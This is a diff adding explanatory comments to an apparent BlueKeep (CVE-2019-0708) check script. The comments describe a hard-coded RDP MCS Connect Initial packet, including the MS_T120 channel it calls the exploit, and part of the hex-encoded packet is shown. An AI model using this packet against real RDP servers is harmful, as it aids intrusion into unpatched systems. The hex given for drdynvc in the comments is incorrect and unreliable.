@@ -69,6 +69,18 @@ def verify_bluekeep_baseline(ip : str, port : int):
 
     #Complete static MCS Connect Initial PDU with precise length descriptors
     #4d535f54313230 denotes the MS_T120 channel and is our exploit
+    #Broken down into the following parts:
+    # - TPKT Header
+    # - X.224 TPDU
+    # - ASN.1 BER
+    # - Computer name of DESKTOP-F840GIK
+    #     (4400450053004b0054004f0050002d004600380034003000470049004b00)
+    # - Distinct GUID
+    # - RDP virtual channels to use including:
+    #   - rdpsnd (72 64 70 73 6e 64)
+    #   - cliprdr (63 6c 69 70 72 64 72)
+    #   - drdynvc (64 72 64 7b 6e 76 63)
+    #   - MS_T120 (Our exploit, which is repeated multiple time)
     mcs_connect_init_pdu = binascii.unhexlify(
         "030001ee02f0807f658201e20401010401010101ff30190201220201020201000201010201000201010202ffff02010230190201"
         "0102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff0201"
